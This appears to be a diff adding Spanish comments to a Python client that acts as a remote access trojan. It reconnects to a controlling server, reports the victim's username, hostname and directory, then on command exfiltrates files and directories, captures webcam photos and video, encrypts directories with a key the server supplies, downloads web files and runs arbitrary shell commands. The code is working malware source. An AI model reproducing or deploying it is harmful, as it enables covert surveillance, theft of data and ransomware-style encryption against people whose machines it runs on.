@@ -13,21 +13,31 @@ from cryptography.fernet import Fernet
 from random import randint
 from udp import UDP
 
+# Clase client-TCP
 class TCP:
+    # Se inicializa el host, el port y el chunk del programa
     def __init__(self, host, port):
+        # host --> standar>localhost
         self.__host = host
+        # port --> 1024-65535
         self.__port = port
+        # chunk --> 4MB para enviar informacion
         self.__chunk = 4194304
 
     def conectar(self):
+        # Se inicia el ciclo para crear la conexion
         while True:
             try:
+                # Se crea un socket
                 self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                # Se configura el socket
                 self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+                # Se intenta conectar al servidor
                 self.__sock.connect((self.__host, self.__port))
 
                 sleep(0.05)
+                # Se obtiene y se manda la informacion inicial
                 userName = getpass.getuser()
                 hostName = socket.gethostname()
                 currentDir = os.getcwd()
@@ -37,13 +47,18 @@ class TCP:
                 break
 
             except:
+                # Si no se consigue una conexion, se espera 5 segundos
                 sleep(5)
 
+    # Funcion para regresar el nombre de un archivo o directorio
+    # ubicacion --> ubicacion del archivo o directorio
     def getNombre(self, ubicacion):
         nombre = os.path.abspath(ubicacion)
         nombre = os.path.basename(nombre)
         return nombre
 
+    # Funcion para regresar si un archivo es una imagen
+    # ubicacion --> ubicacion del archivo
     def isImage(self, ubicacion):
         ext = [".jpg", ".png", ".jpeg", ".webp"]
         imagen = False
@@ -52,13 +67,17 @@ class TCP:
                 imagen = True
                 break
 
+        # Se regresa si el archivo es imagen o no
         return imagen
 
+    # Funcion para enviar datos
+    # info --> informacion a enviar
     def enviarDatos(self, info):
         info = pickle.dumps(info)
         info = struct.pack('Q', len(info))+info
         self.__sock.sendall(info)
 
+    # Funcion para recibir datos
     def recibirDatos(self):
         data = b''
         size = struct.calcsize('Q')
@@ -77,8 +96,11 @@ class TCP:
         data = data[byteSize:]
         info = pickle.loads(info)
 
+        # Se regresa la informacion tratada para ser usada
         return info
 
+    # Funcion para enviar un archivo
+    # ubicacion --> ubicacion del archivo que se quiere enviar
     def enviarArchivo(self, ubicacion):
         sleep(0.05)
         peso = os.path.getsize(ubicacion)
@@ -96,6 +118,8 @@ class TCP:
                     break
         archivo.close()
 
+    # Funcion para recibir un archivo
+    # ubicacion --> ubicacion en donde se guardara el archivo recibido
     def recibirArchivo(self, ubicacion):
         with open(ubicacion, 'wb') as archivo:
             while True:
@@ -109,13 +133,18 @@ class TCP:
                     self.__sock.send("ok".encode())
         archivo.close()
 
+    # Funcion para enviar archivos de un directorio
+    # origen --> ubicacion del directorio que se quiere enviar
+    # index --> indice desde el que se quiere iniciar
     def enviarDirectorio(self, origen, index):
+        # Se crea una lista de archivos
         archivos = []
         for i in os.listdir(origen):
             archivo = f"{origen}/{i}"
             if os.path.isfile(archivo):
                 archivos.append(archivo)
 
+        # Se envia el numero de archivos del directorio al servidor
         sleep(0.2)
         tam = len(archivos)
         self.__sock.send(str(tam).encode())
@@ -123,6 +152,8 @@ class TCP:
         if index > tam:
             index = 1
         while index <= tam:
+            # Se obtiene informacion del archivo en turno y
+            # se envia al servidor
             nombre = self.getNombre(archivos[index-1])
             peso = os.path.getsize(archivos[index-1])
             paquetes = str(int(peso/self.__chunk))
@@ -130,13 +161,19 @@ class TCP:
             sleep(0.1)
             self.__sock.send(info.encode())
 
+            # Se espera la confirmacion del servidor para
+            # enviar o no el archivo
             res = self.__sock.recv(1024).decode()
             if res == 'S':
+                # Se envia el archivo
                 self.enviarArchivo(archivos[index-1])
+                # Se espera un mensaje del servidor para seguir
+                # enviando archivos o no
                 msg = self.__sock.recv(1024).decode()
                 if msg == "error":
                     break
             elif res == "quit":
+                # Si la respuesta es 'quit' se termina la transferencia
                 break
             else:
                 pass
@@ -144,33 +181,47 @@ class TCP:
             index += 1
             sleep(0.05)
 
+    # Funcion para recibir un directorio
+    # destino --> directorio en el que se guardaran los archivos
+    # index --> indice de referencia
     def recibirDirectorio(self, destino, index):
+        # Si no existe el directorio destino, se crea
         if not os.path.isdir(destino):
             os.mkdir(destino)
 
+        # Se recibe el numero de archivos que se recibiran
         tam = int(self.__sock.recv(1024).decode())
 
         if index > tam:
             index = 1
         while index <= tam:
+            # Se espera la confirmacion del servidor para
+            # recibir o no un archivo
             res = self.__sock.recv(1024).decode()
 
             if res == 'S':
                 try:
+                    # Se recibe el nombre del archivo
                     nombre = self.__sock.recv(1024).decode()
+                    # Se recibe el archivo
                     self.recibirArchivo(f"{destino}/{nombre}")
                     sleep(0.08)
+                    # Se envia un mensaje al servidor para
+                    # seguir recibiendo archivos o no
                     self.__sock.send("ok".encode())
                 except:
                     self.__sock.send("error: Error al recibir el archivo (sdt)".encode())
                     break
             elif res == "quit":
+                # Si la respuesta es 'quit' se termina la transferencia
                 break
             else:
                 pass
 
             index += 1
 
+    # Funcion para cambiar de directorio
+    # directorio --> directorio al que se quiere cambiar
     def cd(self, directorio):
         if os.path.isdir(directorio):
             os.chdir(directorio)
@@ -179,6 +230,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
+    # Funcion para enviar un archivo al servidor
+    # cmd --> comando recibido
     def sendFileFrom(self, cmd):
         if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
@@ -204,6 +257,8 @@ class TCP:
             else:
                 self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
+    # Funcion para recibir un archivo del servidor
+    # cmd --> comando recibido
     def sendFileTo(self, cmd):
         if re.search("-d[= ]", cmd):
             destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
@@ -213,6 +268,8 @@ class TCP:
             destino = self.__sock.recv(1024).decode()
             self.recibirArchivo(destino)
 
+    # Funcion para enviar una imagen al servidor
+    # cmd --> comando recibido
     def image(self, cmd):
         if re.search("-r[= ]", cmd):
             imagenes = []
@@ -246,6 +303,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
 
+    # Funcion para tomar una foto y enviarla al servidor
+    # cmd --> comando recibido
     def pic(self, cmd):
         camara = int(re.findall("-c[= ]([0-9].*)", cmd)[0])
         captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
@@ -263,6 +322,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
 
+    # Funcion para enviar video de la camara al servidor
+    # cmd --> comando recibido
     def captura(self, cmd):
         camara = int(re.findall("-c[= ]([0-9. ].*)", cmd)[0])
         udp = UDP(self.__host, self.__port)
@@ -284,6 +345,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
 
+    # Funcion para enviar un directorio al servidor
+    # cmd --> comando recibido
     def sendDirFrom(self, cmd):
         if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
@@ -320,6 +383,8 @@ class TCP:
             else:
                 self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
 
+    # Funcion para recibir un directorio del servidor
+    # cmd --> comando recibido
     def sendDirTo(self, cmd):
         if re.search("-d[= ]", cmd):
             if re.search("-i[= ]", cmd):
@@ -344,6 +409,8 @@ class TCP:
             destino = self.__sock.recv(1024).decode()
             self.recibirDirectorio(destino, index)
 
+    # Funcion para comprimir un directorio
+    # cmd --> comando recibido
     def comprimir(self, cmd):
         if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
@@ -377,6 +444,8 @@ class TCP:
 
         self.__sock.send(info.encode())
 
+    # Funcion para descomprimir un archivo '.zip'
+    # cmd --> comando recibido
     def descomprimir(self, cmd):
         if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
@@ -400,6 +469,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
+    # Funcion para encriptar un directorio
+    # cmd --> comando recibido
     def encrypt(self, cmd):
         key = self.__sock.recv(1024)
         directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
@@ -450,6 +521,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
+    # Funcion para desencriptar un directorio
+    # cmd --> comando recibido
     def decrypt(self, cmd):
         key = self.__sock.recv(1024)
         directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
@@ -501,6 +574,8 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
+    # Funcion para descargar archivo web
+    # cmd --> comando recibido
     def wget(self, cmd):
         extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
             "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
@@ -539,118 +614,167 @@ class TCP:
         except:
             self.__sock.send(f"error: Error al descargar el archivo".encode())
 
+    # Funcion para recibir y evaluar comandos
     def shell(self):
         try:
             while True:
+                # Se recibe el comando
                 cmd = self.__sock.recv(1024).decode()
 
+                # Si el comando es 'exit'...
                 if cmd.lower() == "exit":
                     try:
+                        # Se termina la conexion
                         self.__sock.close()
                         break
 
                     except:
                         continue
 
+                # Si el comando es 'q' o 'quit'...
                 elif cmd.lower() == 'q' or cmd.lower() == "quit":
                     try:
+                        # Se cierra el socket
                         self.__sock.close()
+                        # Y se manda a llamar a la funcion
+                        # 'self.conectar'
                         self.conectar()
 
                     except:
                         continue
 
+                # Si el comando es 'cd'...
                 elif cmd.lower()[:2] == "cd":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.cd'
                         self.cd(cmd[3:])
 
                     except:
                         continue
 
+                # Si el comando es 'sff'...
                 elif cmd.lower()[:3] == "sff":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.sendFileFrom'
                         self.sendFileFrom(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'sft'...
                 elif cmd.lower()[:3] == "sft":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.sendFileTo'
                         self.sendFileTo(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'img'...
                 elif cmd.lower()[:3] == "img":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.image'
                         self.image(cmd)
 
                     except:
                         continue
-                
+
+                # Si el comando es 'pic'...
                 elif cmd.lower()[:3] == "pic":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.pic'
                         self.pic(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'cap'...
                 elif cmd.lower()[:3] == "cap":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.captura'
                         self.captura(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'sdf'...
                 elif cmd.lower()[:3] == "sdf":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.sendDirFrom'
                         self.sendDirFrom(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'sdt'...
                 elif cmd.lower()[:3] == "sdt":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.sendDirTo'
                         self.sendDirTo(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'zip'...
                 elif cmd.lower()[:3] == "zip":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.comprimir'
                         self.comprimir(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'unzip'...
                 elif cmd.lower()[:5] == "unzip":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.descomprimir'
                         self.descomprimir(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'encrypt'...
                 elif cmd.lower()[:7] == "encrypt":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.encrypt'
                         self.encrypt(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'decrypt'...
                 elif cmd.lower()[:7] == "decrypt":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.decrypt'
                         self.decrypt(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'miwget'...
                 elif cmd.lower()[:6] == "miwget":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.wget'
                         self.wget(cmd)
 
                     except:
                         continue
 
+                # Si no hay una coincidencia, se ejecuta el comando
+                # y se envia lo que este regresa
                 else:
                     try:
                         if cmd.lower()[:4] == "open":
